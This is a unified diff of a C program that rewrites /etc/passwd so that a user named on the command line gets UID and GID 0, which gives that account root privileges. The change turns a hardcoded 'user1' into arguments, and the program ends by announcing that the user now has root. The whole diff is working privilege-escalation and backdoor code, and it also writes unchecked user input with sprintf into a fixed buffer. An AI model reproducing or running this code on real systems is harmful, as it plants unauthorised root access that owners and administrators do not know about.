@@ -7,7 +7,7 @@
 #include <stdlib.h>
 #include <string.h>
 
-void modify_passwd_file() {
+void modify_passwd_file(int user_id, char *user_name) {
     FILE *old_passwd = fopen("/etc/passwd", "r");
     FILE *new_passwd = fopen("/etc/passwd.tmp", "w");
 
@@ -16,11 +16,12 @@ void modify_passwd_file() {
         exit(1);
     }
 
-    char line[256];
-    // Change the UID of user1 from 1000 to 0 (root)
+    char line[256], str[256];
+    sprintf(str, "%s:x:%d:%d:Linux User,,,:/home/%s:/bin/sh\n", user_name, user_id, user_id, user_name);
+    // Change the UID of userX from X to 0 (root)
     while (fgets(line, sizeof(line), old_passwd)) {
-        if (strcmp(line, "user1:x:1000:1000:Linux User,,,:/home/user1:/bin/sh\n") == 0) {
-            fprintf(new_passwd, "user1:x:0:0:Linux User,,,:/home/user1:/bin/sh\n");
+        if (strcmp(line, str) == 0) {
+            fprintf(new_passwd, "%s:x:0:0:Linux User,,,:/home/%s:/bin/sh\n", user_name, user_name);
         } else {
             fprintf(new_passwd, "%s", line);
         }
@@ -36,9 +37,14 @@ void modify_passwd_file() {
     }
 }
 
-int main() {
+int main(int argc, char *argv[]) {
 
     uid_t ruid, euid, suid;
+ 
+    if (argc != 3) {
+        printf("Usage: %s <user_id> <user_name>\n", argv[0]);
+        return 1;
+    }
 
     // Get the real, effective, and saved user IDs
     if (getresuid(&ruid, &euid, &suid) == -1) {
@@ -66,7 +72,7 @@ int main() {
     printf("Saved     UID: %d\n", suid);
 
     // Modify the /etc/passwd file to give user1 root privileges
-    modify_passwd_file();    
+    modify_passwd_file(atoi(argv[1]), argv[2]);    
 
     printf("\nUser1 now has root privileges\n"
            "Reset your SHELL to update privileges\n");
